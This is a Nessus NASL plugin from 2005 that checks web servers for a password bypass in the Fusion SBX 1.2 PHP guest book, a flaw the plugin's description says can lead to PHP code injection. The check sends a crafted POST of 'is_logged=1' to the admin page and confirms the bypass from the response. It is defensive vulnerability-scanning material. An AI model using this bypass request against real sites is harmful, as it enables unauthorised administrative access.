#
# Script by Noam Rathaus GPLv2
#
# "Dave" <dave@kidindustries.net>
# 2005-05-05 07:03
# Fusion SBX 1.2 password bypass and remote command execution

if(description)
{
 script_id(18210);
 script_bugtraq_id(13575);
 script_version("$Revision: 1.2 $");
 
 name["english"] = "Fusion SBX Password Bypass and Command Execution";

 script_name(english:name["english"]);
 
 desc["english"] = "
The remote host is running Fusion SBX, a guest book written in PHP.

A vulnerability in the remote version of this software allows remote 
attackers to modify the product's settings without knowing the
administrator password, in addition by injecting arbitrary
PHP code to one of the board's settings a remote attacker
is able to cause the program to execute arbitrary code.

Solution : None at this time
Risk factor: Medium";

 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for the presence of a Fusion SBX Password Bypass";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2005 Noam Rathaus");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

function check(loc)
{
 req = string("POST ", loc, "/admin/index.php HTTP/1.1\r\n",
 "Host: ", get_host_name(), "\r\n",
 "User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Gecko/20041207 Firefox/1.0\r\n",
 "Content-Type: application/x-www-form-urlencoded\r\n",
 "Content-Length: 11\r\n",
 "\r\n",
 "is_logged=1");
 r = http_keepalive_send_recv(port:port, data:req);
 if( r == NULL )exit(0);
 if("data/data.db" >< r && "data/ipban.db" >< r)
 {
  security_warning(port:port);
  exit(0);
 }
}

foreach dir ( cgi_dirs() ) check(loc:dir);

